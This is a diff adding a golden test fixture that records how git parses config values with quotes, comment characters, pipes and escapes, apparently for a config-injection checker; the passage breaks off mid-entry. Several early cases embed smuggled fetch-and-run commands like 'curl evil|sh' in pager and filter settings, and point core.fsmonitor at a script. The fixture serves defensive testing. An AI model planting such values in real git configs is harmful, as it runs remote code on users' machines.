@@ -184,6 +184,3378 @@
         "core.fsmonitor="
       ],
       "gitError": null
+    },
+    "quote-mid-comment": {
+      "config": "[filter \"x\"]\n\tclean = cat\" ; curl evil|sh\"\n",
+      "git": [
+        "filter.x.clean=cat ; curl evil|sh"
+      ],
+      "gitError": null
+    },
+    "quote-mid-hash": {
+      "config": "[filter \"x\"]\n\tclean = cat\" # curl evil|sh\"\n",
+      "git": [
+        "filter.x.clean=cat # curl evil|sh"
+      ],
+      "gitError": null
+    },
+    "quote-around-semicolon": {
+      "config": "[core]\n\tpager = /tmp/a\" ; \"b\n",
+      "git": [
+        "core.pager=/tmp/a ; b"
+      ],
+      "gitError": null
+    },
+    "quote-split-value": {
+      "config": "[core]\n\tpager = p\" ; \"q\n",
+      "git": [
+        "core.pager=p ; q"
+      ],
+      "gitError": null
+    },
+    "quote-hash-split": {
+      "config": "[core]\n\teditor = a\" # \"b\n",
+      "git": [
+        "core.editor=a # b"
+      ],
+      "gitError": null
+    },
+    "quote-trailing-semicolon": {
+      "config": "[core]\n\teditor = vim\" ;\"\n",
+      "git": [
+        "core.editor=vim ;"
+      ],
+      "gitError": null
+    },
+    "quoted-then-comment": {
+      "config": "[core]\n\tpager = \"less\" ; curl x|sh\n",
+      "git": [
+        "core.pager=less"
+      ],
+      "gitError": null
+    },
+    "bare-then-semicolon": {
+      "config": "[core]\n\tpager = less;curl x|sh\n",
+      "git": [
+        "core.pager=less"
+      ],
+      "gitError": null
+    },
+    "bare-then-hash": {
+      "config": "[core]\n\tpager = less#curl x|sh\n",
+      "git": [
+        "core.pager=less"
+      ],
+      "gitError": null
+    },
+    "empty-quotes": {
+      "config": "[core]\n\tpager = \"\"\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "quotes-around-whole": {
+      "config": "[core]\n\tfsmonitor = \"/tmp/x.sh\"\n",
+      "git": [
+        "core.fsmonitor=/tmp/x.sh"
+      ],
+      "gitError": null
+    },
+    "quote-then-space": {
+      "config": "[core]\n\tfsmonitor = \"/tmp/x.sh\" \n",
+      "git": [
+        "core.fsmonitor=/tmp/x.sh"
+      ],
+      "gitError": null
+    },
+    "double-quoted-runs": {
+      "config": "[core]\n\tfsmonitor = \"/tmp/\"\"x.sh\"\n",
+      "git": [
+        "core.fsmonitor=/tmp/x.sh"
+      ],
+      "gitError": null
+    },
+    "escaped-quote-in-bare": {
+      "config": "[core]\n\tpager = a\\\"b\n",
+      "git": [
+        "core.pager=a\"b"
+      ],
+      "gitError": null
+    },
+    "backslash-before-semicolon": {
+      "config": "[core]\n\tpager = a\\;b\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/backslash-before-semicolon.gitconfig"
+    },
+    "unbalanced-quote": {
+      "config": "[core]\n\tfsmonitor = /tmp/x.sh\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/unbalanced-quote.gitconfig"
+    },
+    "perm-000": {
+      "config": "[core]\n\tpager = cmdx\n",
+      "git": [
+        "core.pager=cmdx"
+      ],
+      "gitError": null
+    },
+    "perm-001": {
+      "config": "[core]\n\tpager = cmdxa\n",
+      "git": [
+        "core.pager=cmdxa"
+      ],
+      "gitError": null
+    },
+    "perm-002": {
+      "config": "[core]\n\tpager = cmdx\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-002.gitconfig"
+    },
+    "perm-003": {
+      "config": "[core]\n\tpager = cmdx#\n",
+      "git": [
+        "core.pager=cmdx"
+      ],
+      "gitError": null
+    },
+    "perm-004": {
+      "config": "[core]\n\tpager = cmdx;\n",
+      "git": [
+        "core.pager=cmdx"
+      ],
+      "gitError": null
+    },
+    "perm-005": {
+      "config": "[core]\n\tpager = cmdx \n",
+      "git": [
+        "core.pager=cmdx"
+      ],
+      "gitError": null
+    },
+    "perm-006": {
+      "config": "[core]\n\tpager = cmdx\\\\\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-006.gitconfig"
+    },
+    "perm-007": {
+      "config": "[core]\n\tpager = cmdx|\n",
+      "git": [
+        "core.pager=cmdx|"
+      ],
+      "gitError": null
+    },
+    "perm-010": {
+      "config": "[core]\n\tpager = cmdax\n",
+      "git": [
+        "core.pager=cmdax"
+      ],
+      "gitError": null
+    },
+    "perm-011": {
+      "config": "[core]\n\tpager = cmdaxa\n",
+      "git": [
+        "core.pager=cmdaxa"
+      ],
+      "gitError": null
+    },
+    "perm-012": {
+      "config": "[core]\n\tpager = cmdax\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-012.gitconfig"
+    },
+    "perm-013": {
+      "config": "[core]\n\tpager = cmdax#\n",
+      "git": [
+        "core.pager=cmdax"
+      ],
+      "gitError": null
+    },
+    "perm-014": {
+      "config": "[core]\n\tpager = cmdax;\n",
+      "git": [
+        "core.pager=cmdax"
+      ],
+      "gitError": null
+    },
+    "perm-015": {
+      "config": "[core]\n\tpager = cmdax \n",
+      "git": [
+        "core.pager=cmdax"
+      ],
+      "gitError": null
+    },
+    "perm-016": {
+      "config": "[core]\n\tpager = cmdax\\\\\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-016.gitconfig"
+    },
+    "perm-017": {
+      "config": "[core]\n\tpager = cmdax|\n",
+      "git": [
+        "core.pager=cmdax|"
+      ],
+      "gitError": null
+    },
+    "perm-020": {
+      "config": "[core]\n\tpager = cmd\"x\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-020.gitconfig"
+    },
+    "perm-021": {
+      "config": "[core]\n\tpager = cmd\"xa\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-021.gitconfig"
+    },
+    "perm-022": {
+      "config": "[core]\n\tpager = cmd\"x\"\n",
+      "git": [
+        "core.pager=cmdx"
+      ],
+      "gitError": null
+    },
+    "perm-023": {
+      "config": "[core]\n\tpager = cmd\"x#\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-023.gitconfig"
+    },
+    "perm-024": {
+      "config": "[core]\n\tpager = cmd\"x;\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-024.gitconfig"
+    },
+    "perm-025": {
+      "config": "[core]\n\tpager = cmd\"x \n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-025.gitconfig"
+    },
+    "perm-026": {
+      "config": "[core]\n\tpager = cmd\"x\\\\\"\n",
+      "git": [
+        "core.pager=cmdx\\"
+      ],
+      "gitError": null
+    },
+    "perm-027": {
+      "config": "[core]\n\tpager = cmd\"x|\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-027.gitconfig"
+    },
+    "perm-030": {
+      "config": "[core]\n\tpager = cmd#x\n",
+      "git": [
+        "core.pager=cmd"
+      ],
+      "gitError": null
+    },
+    "perm-031": {
+      "config": "[core]\n\tpager = cmd#xa\n",
+      "git": [
+        "core.pager=cmd"
+      ],
+      "gitError": null
+    },
+    "perm-032": {
+      "config": "[core]\n\tpager = cmd#x\"\n",
+      "git": [
+        "core.pager=cmd"
+      ],
+      "gitError": null
+    },
+    "perm-033": {
+      "config": "[core]\n\tpager = cmd#x#\n",
+      "git": [
+        "core.pager=cmd"
+      ],
+      "gitError": null
+    },
+    "perm-034": {
+      "config": "[core]\n\tpager = cmd#x;\n",
+      "git": [
+        "core.pager=cmd"
+      ],
+      "gitError": null
+    },
+    "perm-035": {
+      "config": "[core]\n\tpager = cmd#x \n",
+      "git": [
+        "core.pager=cmd"
+      ],
+      "gitError": null
+    },
+    "perm-036": {
+      "config": "[core]\n\tpager = cmd#x\\\\\"\n",
+      "git": [
+        "core.pager=cmd"
+      ],
+      "gitError": null
+    },
+    "perm-037": {
+      "config": "[core]\n\tpager = cmd#x|\n",
+      "git": [
+        "core.pager=cmd"
+      ],
+      "gitError": null
+    },
+    "perm-040": {
+      "config": "[core]\n\tpager = cmd;x\n",
+      "git": [
+        "core.pager=cmd"
+      ],
+      "gitError": null
+    },
+    "perm-041": {
+      "config": "[core]\n\tpager = cmd;xa\n",
+      "git": [
+        "core.pager=cmd"
+      ],
+      "gitError": null
+    },
+    "perm-042": {
+      "config": "[core]\n\tpager = cmd;x\"\n",
+      "git": [
+        "core.pager=cmd"
+      ],
+      "gitError": null
+    },
+    "perm-043": {
+      "config": "[core]\n\tpager = cmd;x#\n",
+      "git": [
+        "core.pager=cmd"
+      ],
+      "gitError": null
+    },
+    "perm-044": {
+      "config": "[core]\n\tpager = cmd;x;\n",
+      "git": [
+        "core.pager=cmd"
+      ],
+      "gitError": null
+    },
+    "perm-045": {
+      "config": "[core]\n\tpager = cmd;x \n",
+      "git": [
+        "core.pager=cmd"
+      ],
+      "gitError": null
+    },
+    "perm-046": {
+      "config": "[core]\n\tpager = cmd;x\\\\\"\n",
+      "git": [
+        "core.pager=cmd"
+      ],
+      "gitError": null
+    },
+    "perm-047": {
+      "config": "[core]\n\tpager = cmd;x|\n",
+      "git": [
+        "core.pager=cmd"
+      ],
+      "gitError": null
+    },
+    "perm-050": {
+      "config": "[core]\n\tpager = cmd x\n",
+      "git": [
+        "core.pager=cmd x"
+      ],
+      "gitError": null
+    },
+    "perm-051": {
+      "config": "[core]\n\tpager = cmd xa\n",
+      "git": [
+        "core.pager=cmd xa"
+      ],
+      "gitError": null
+    },
+    "perm-052": {
+      "config": "[core]\n\tpager = cmd x\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-052.gitconfig"
+    },
+    "perm-053": {
+      "config": "[core]\n\tpager = cmd x#\n",
+      "git": [
+        "core.pager=cmd x"
+      ],
+      "gitError": null
+    },
+    "perm-054": {
+      "config": "[core]\n\tpager = cmd x;\n",
+      "git": [
+        "core.pager=cmd x"
+      ],
+      "gitError": null
+    },
+    "perm-055": {
+      "config": "[core]\n\tpager = cmd x \n",
+      "git": [
+        "core.pager=cmd x"
+      ],
+      "gitError": null
+    },
+    "perm-056": {
+      "config": "[core]\n\tpager = cmd x\\\\\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-056.gitconfig"
+    },
+    "perm-057": {
+      "config": "[core]\n\tpager = cmd x|\n",
+      "git": [
+        "core.pager=cmd x|"
+      ],
+      "gitError": null
+    },
+    "perm-060": {
+      "config": "[core]\n\tpager = cmd\\\\\"x\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-060.gitconfig"
+    },
+    "perm-061": {
+      "config": "[core]\n\tpager = cmd\\\\\"xa\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-061.gitconfig"
+    },
+    "perm-062": {
+      "config": "[core]\n\tpager = cmd\\\\\"x\"\n",
+      "git": [
+        "core.pager=cmd\\x"
+      ],
+      "gitError": null
+    },
+    "perm-063": {
+      "config": "[core]\n\tpager = cmd\\\\\"x#\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-063.gitconfig"
+    },
+    "perm-064": {
+      "config": "[core]\n\tpager = cmd\\\\\"x;\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-064.gitconfig"
+    },
+    "perm-065": {
+      "config": "[core]\n\tpager = cmd\\\\\"x \n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-065.gitconfig"
+    },
+    "perm-066": {
+      "config": "[core]\n\tpager = cmd\\\\\"x\\\\\"\n",
+      "git": [
+        "core.pager=cmd\\x\\"
+      ],
+      "gitError": null
+    },
+    "perm-067": {
+      "config": "[core]\n\tpager = cmd\\\\\"x|\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-067.gitconfig"
+    },
+    "perm-070": {
+      "config": "[core]\n\tpager = cmd|x\n",
+      "git": [
+        "core.pager=cmd|x"
+      ],
+      "gitError": null
+    },
+    "perm-071": {
+      "config": "[core]\n\tpager = cmd|xa\n",
+      "git": [
+        "core.pager=cmd|xa"
+      ],
+      "gitError": null
+    },
+    "perm-072": {
+      "config": "[core]\n\tpager = cmd|x\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-072.gitconfig"
+    },
+    "perm-073": {
+      "config": "[core]\n\tpager = cmd|x#\n",
+      "git": [
+        "core.pager=cmd|x"
+      ],
+      "gitError": null
+    },
+    "perm-074": {
+      "config": "[core]\n\tpager = cmd|x;\n",
+      "git": [
+        "core.pager=cmd|x"
+      ],
+      "gitError": null
+    },
+    "perm-075": {
+      "config": "[core]\n\tpager = cmd|x \n",
+      "git": [
+        "core.pager=cmd|x"
+      ],
+      "gitError": null
+    },
+    "perm-076": {
+      "config": "[core]\n\tpager = cmd|x\\\\\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-076.gitconfig"
+    },
+    "perm-077": {
+      "config": "[core]\n\tpager = cmd|x|\n",
+      "git": [
+        "core.pager=cmd|x|"
+      ],
+      "gitError": null
+    },
+    "perm-100": {
+      "config": "[core]\n\tpager = acmdx\n",
+      "git": [
+        "core.pager=acmdx"
+      ],
+      "gitError": null
+    },
+    "perm-101": {
+      "config": "[core]\n\tpager = acmdxa\n",
+      "git": [
+        "core.pager=acmdxa"
+      ],
+      "gitError": null
+    },
+    "perm-102": {
+      "config": "[core]\n\tpager = acmdx\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-102.gitconfig"
+    },
+    "perm-103": {
+      "config": "[core]\n\tpager = acmdx#\n",
+      "git": [
+        "core.pager=acmdx"
+      ],
+      "gitError": null
+    },
+    "perm-104": {
+      "config": "[core]\n\tpager = acmdx;\n",
+      "git": [
+        "core.pager=acmdx"
+      ],
+      "gitError": null
+    },
+    "perm-105": {
+      "config": "[core]\n\tpager = acmdx \n",
+      "git": [
+        "core.pager=acmdx"
+      ],
+      "gitError": null
+    },
+    "perm-106": {
+      "config": "[core]\n\tpager = acmdx\\\\\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-106.gitconfig"
+    },
+    "perm-107": {
+      "config": "[core]\n\tpager = acmdx|\n",
+      "git": [
+        "core.pager=acmdx|"
+      ],
+      "gitError": null
+    },
+    "perm-110": {
+      "config": "[core]\n\tpager = acmdax\n",
+      "git": [
+        "core.pager=acmdax"
+      ],
+      "gitError": null
+    },
+    "perm-111": {
+      "config": "[core]\n\tpager = acmdaxa\n",
+      "git": [
+        "core.pager=acmdaxa"
+      ],
+      "gitError": null
+    },
+    "perm-112": {
+      "config": "[core]\n\tpager = acmdax\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-112.gitconfig"
+    },
+    "perm-113": {
+      "config": "[core]\n\tpager = acmdax#\n",
+      "git": [
+        "core.pager=acmdax"
+      ],
+      "gitError": null
+    },
+    "perm-114": {
+      "config": "[core]\n\tpager = acmdax;\n",
+      "git": [
+        "core.pager=acmdax"
+      ],
+      "gitError": null
+    },
+    "perm-115": {
+      "config": "[core]\n\tpager = acmdax \n",
+      "git": [
+        "core.pager=acmdax"
+      ],
+      "gitError": null
+    },
+    "perm-116": {
+      "config": "[core]\n\tpager = acmdax\\\\\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-116.gitconfig"
+    },
+    "perm-117": {
+      "config": "[core]\n\tpager = acmdax|\n",
+      "git": [
+        "core.pager=acmdax|"
+      ],
+      "gitError": null
+    },
+    "perm-120": {
+      "config": "[core]\n\tpager = acmd\"x\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-120.gitconfig"
+    },
+    "perm-121": {
+      "config": "[core]\n\tpager = acmd\"xa\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-121.gitconfig"
+    },
+    "perm-122": {
+      "config": "[core]\n\tpager = acmd\"x\"\n",
+      "git": [
+        "core.pager=acmdx"
+      ],
+      "gitError": null
+    },
+    "perm-123": {
+      "config": "[core]\n\tpager = acmd\"x#\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-123.gitconfig"
+    },
+    "perm-124": {
+      "config": "[core]\n\tpager = acmd\"x;\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-124.gitconfig"
+    },
+    "perm-125": {
+      "config": "[core]\n\tpager = acmd\"x \n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-125.gitconfig"
+    },
+    "perm-126": {
+      "config": "[core]\n\tpager = acmd\"x\\\\\"\n",
+      "git": [
+        "core.pager=acmdx\\"
+      ],
+      "gitError": null
+    },
+    "perm-127": {
+      "config": "[core]\n\tpager = acmd\"x|\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-127.gitconfig"
+    },
+    "perm-130": {
+      "config": "[core]\n\tpager = acmd#x\n",
+      "git": [
+        "core.pager=acmd"
+      ],
+      "gitError": null
+    },
+    "perm-131": {
+      "config": "[core]\n\tpager = acmd#xa\n",
+      "git": [
+        "core.pager=acmd"
+      ],
+      "gitError": null
+    },
+    "perm-132": {
+      "config": "[core]\n\tpager = acmd#x\"\n",
+      "git": [
+        "core.pager=acmd"
+      ],
+      "gitError": null
+    },
+    "perm-133": {
+      "config": "[core]\n\tpager = acmd#x#\n",
+      "git": [
+        "core.pager=acmd"
+      ],
+      "gitError": null
+    },
+    "perm-134": {
+      "config": "[core]\n\tpager = acmd#x;\n",
+      "git": [
+        "core.pager=acmd"
+      ],
+      "gitError": null
+    },
+    "perm-135": {
+      "config": "[core]\n\tpager = acmd#x \n",
+      "git": [
+        "core.pager=acmd"
+      ],
+      "gitError": null
+    },
+    "perm-136": {
+      "config": "[core]\n\tpager = acmd#x\\\\\"\n",
+      "git": [
+        "core.pager=acmd"
+      ],
+      "gitError": null
+    },
+    "perm-137": {
+      "config": "[core]\n\tpager = acmd#x|\n",
+      "git": [
+        "core.pager=acmd"
+      ],
+      "gitError": null
+    },
+    "perm-140": {
+      "config": "[core]\n\tpager = acmd;x\n",
+      "git": [
+        "core.pager=acmd"
+      ],
+      "gitError": null
+    },
+    "perm-141": {
+      "config": "[core]\n\tpager = acmd;xa\n",
+      "git": [
+        "core.pager=acmd"
+      ],
+      "gitError": null
+    },
+    "perm-142": {
+      "config": "[core]\n\tpager = acmd;x\"\n",
+      "git": [
+        "core.pager=acmd"
+      ],
+      "gitError": null
+    },
+    "perm-143": {
+      "config": "[core]\n\tpager = acmd;x#\n",
+      "git": [
+        "core.pager=acmd"
+      ],
+      "gitError": null
+    },
+    "perm-144": {
+      "config": "[core]\n\tpager = acmd;x;\n",
+      "git": [
+        "core.pager=acmd"
+      ],
+      "gitError": null
+    },
+    "perm-145": {
+      "config": "[core]\n\tpager = acmd;x \n",
+      "git": [
+        "core.pager=acmd"
+      ],
+      "gitError": null
+    },
+    "perm-146": {
+      "config": "[core]\n\tpager = acmd;x\\\\\"\n",
+      "git": [
+        "core.pager=acmd"
+      ],
+      "gitError": null
+    },
+    "perm-147": {
+      "config": "[core]\n\tpager = acmd;x|\n",
+      "git": [
+        "core.pager=acmd"
+      ],
+      "gitError": null
+    },
+    "perm-150": {
+      "config": "[core]\n\tpager = acmd x\n",
+      "git": [
+        "core.pager=acmd x"
+      ],
+      "gitError": null
+    },
+    "perm-151": {
+      "config": "[core]\n\tpager = acmd xa\n",
+      "git": [
+        "core.pager=acmd xa"
+      ],
+      "gitError": null
+    },
+    "perm-152": {
+      "config": "[core]\n\tpager = acmd x\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-152.gitconfig"
+    },
+    "perm-153": {
+      "config": "[core]\n\tpager = acmd x#\n",
+      "git": [
+        "core.pager=acmd x"
+      ],
+      "gitError": null
+    },
+    "perm-154": {
+      "config": "[core]\n\tpager = acmd x;\n",
+      "git": [
+        "core.pager=acmd x"
+      ],
+      "gitError": null
+    },
+    "perm-155": {
+      "config": "[core]\n\tpager = acmd x \n",
+      "git": [
+        "core.pager=acmd x"
+      ],
+      "gitError": null
+    },
+    "perm-156": {
+      "config": "[core]\n\tpager = acmd x\\\\\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-156.gitconfig"
+    },
+    "perm-157": {
+      "config": "[core]\n\tpager = acmd x|\n",
+      "git": [
+        "core.pager=acmd x|"
+      ],
+      "gitError": null
+    },
+    "perm-160": {
+      "config": "[core]\n\tpager = acmd\\\\\"x\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-160.gitconfig"
+    },
+    "perm-161": {
+      "config": "[core]\n\tpager = acmd\\\\\"xa\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-161.gitconfig"
+    },
+    "perm-162": {
+      "config": "[core]\n\tpager = acmd\\\\\"x\"\n",
+      "git": [
+        "core.pager=acmd\\x"
+      ],
+      "gitError": null
+    },
+    "perm-163": {
+      "config": "[core]\n\tpager = acmd\\\\\"x#\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-163.gitconfig"
+    },
+    "perm-164": {
+      "config": "[core]\n\tpager = acmd\\\\\"x;\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-164.gitconfig"
+    },
+    "perm-165": {
+      "config": "[core]\n\tpager = acmd\\\\\"x \n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-165.gitconfig"
+    },
+    "perm-166": {
+      "config": "[core]\n\tpager = acmd\\\\\"x\\\\\"\n",
+      "git": [
+        "core.pager=acmd\\x\\"
+      ],
+      "gitError": null
+    },
+    "perm-167": {
+      "config": "[core]\n\tpager = acmd\\\\\"x|\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-167.gitconfig"
+    },
+    "perm-170": {
+      "config": "[core]\n\tpager = acmd|x\n",
+      "git": [
+        "core.pager=acmd|x"
+      ],
+      "gitError": null
+    },
+    "perm-171": {
+      "config": "[core]\n\tpager = acmd|xa\n",
+      "git": [
+        "core.pager=acmd|xa"
+      ],
+      "gitError": null
+    },
+    "perm-172": {
+      "config": "[core]\n\tpager = acmd|x\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-172.gitconfig"
+    },
+    "perm-173": {
+      "config": "[core]\n\tpager = acmd|x#\n",
+      "git": [
+        "core.pager=acmd|x"
+      ],
+      "gitError": null
+    },
+    "perm-174": {
+      "config": "[core]\n\tpager = acmd|x;\n",
+      "git": [
+        "core.pager=acmd|x"
+      ],
+      "gitError": null
+    },
+    "perm-175": {
+      "config": "[core]\n\tpager = acmd|x \n",
+      "git": [
+        "core.pager=acmd|x"
+      ],
+      "gitError": null
+    },
+    "perm-176": {
+      "config": "[core]\n\tpager = acmd|x\\\\\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-176.gitconfig"
+    },
+    "perm-177": {
+      "config": "[core]\n\tpager = acmd|x|\n",
+      "git": [
+        "core.pager=acmd|x|"
+      ],
+      "gitError": null
+    },
+    "perm-200": {
+      "config": "[core]\n\tpager = \"cmdx\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-200.gitconfig"
+    },
+    "perm-201": {
+      "config": "[core]\n\tpager = \"cmdxa\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-201.gitconfig"
+    },
+    "perm-202": {
+      "config": "[core]\n\tpager = \"cmdx\"\n",
+      "git": [
+        "core.pager=cmdx"
+      ],
+      "gitError": null
+    },
+    "perm-203": {
+      "config": "[core]\n\tpager = \"cmdx#\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-203.gitconfig"
+    },
+    "perm-204": {
+      "config": "[core]\n\tpager = \"cmdx;\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-204.gitconfig"
+    },
+    "perm-205": {
+      "config": "[core]\n\tpager = \"cmdx \n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-205.gitconfig"
+    },
+    "perm-206": {
+      "config": "[core]\n\tpager = \"cmdx\\\\\"\n",
+      "git": [
+        "core.pager=cmdx\\"
+      ],
+      "gitError": null
+    },
+    "perm-207": {
+      "config": "[core]\n\tpager = \"cmdx|\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-207.gitconfig"
+    },
+    "perm-210": {
+      "config": "[core]\n\tpager = \"cmdax\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-210.gitconfig"
+    },
+    "perm-211": {
+      "config": "[core]\n\tpager = \"cmdaxa\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-211.gitconfig"
+    },
+    "perm-212": {
+      "config": "[core]\n\tpager = \"cmdax\"\n",
+      "git": [
+        "core.pager=cmdax"
+      ],
+      "gitError": null
+    },
+    "perm-213": {
+      "config": "[core]\n\tpager = \"cmdax#\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-213.gitconfig"
+    },
+    "perm-214": {
+      "config": "[core]\n\tpager = \"cmdax;\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-214.gitconfig"
+    },
+    "perm-215": {
+      "config": "[core]\n\tpager = \"cmdax \n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-215.gitconfig"
+    },
+    "perm-216": {
+      "config": "[core]\n\tpager = \"cmdax\\\\\"\n",
+      "git": [
+        "core.pager=cmdax\\"
+      ],
+      "gitError": null
+    },
+    "perm-217": {
+      "config": "[core]\n\tpager = \"cmdax|\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-217.gitconfig"
+    },
+    "perm-220": {
+      "config": "[core]\n\tpager = \"cmd\"x\n",
+      "git": [
+        "core.pager=cmdx"
+      ],
+      "gitError": null
+    },
+    "perm-221": {
+      "config": "[core]\n\tpager = \"cmd\"xa\n",
+      "git": [
+        "core.pager=cmdxa"
+      ],
+      "gitError": null
+    },
+    "perm-222": {
+      "config": "[core]\n\tpager = \"cmd\"x\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-222.gitconfig"
+    },
+    "perm-223": {
+      "config": "[core]\n\tpager = \"cmd\"x#\n",
+      "git": [
+        "core.pager=cmdx"
+      ],
+      "gitError": null
+    },
+    "perm-224": {
+      "config": "[core]\n\tpager = \"cmd\"x;\n",
+      "git": [
+        "core.pager=cmdx"
+      ],
+      "gitError": null
+    },
+    "perm-225": {
+      "config": "[core]\n\tpager = \"cmd\"x \n",
+      "git": [
+        "core.pager=cmdx"
+      ],
+      "gitError": null
+    },
+    "perm-226": {
+      "config": "[core]\n\tpager = \"cmd\"x\\\\\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-226.gitconfig"
+    },
+    "perm-227": {
+      "config": "[core]\n\tpager = \"cmd\"x|\n",
+      "git": [
+        "core.pager=cmdx|"
+      ],
+      "gitError": null
+    },
+    "perm-230": {
+      "config": "[core]\n\tpager = \"cmd#x\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-230.gitconfig"
+    },
+    "perm-231": {
+      "config": "[core]\n\tpager = \"cmd#xa\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-231.gitconfig"
+    },
+    "perm-232": {
+      "config": "[core]\n\tpager = \"cmd#x\"\n",
+      "git": [
+        "core.pager=cmd#x"
+      ],
+      "gitError": null
+    },
+    "perm-233": {
+      "config": "[core]\n\tpager = \"cmd#x#\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-233.gitconfig"
+    },
+    "perm-234": {
+      "config": "[core]\n\tpager = \"cmd#x;\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-234.gitconfig"
+    },
+    "perm-235": {
+      "config": "[core]\n\tpager = \"cmd#x \n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-235.gitconfig"
+    },
+    "perm-236": {
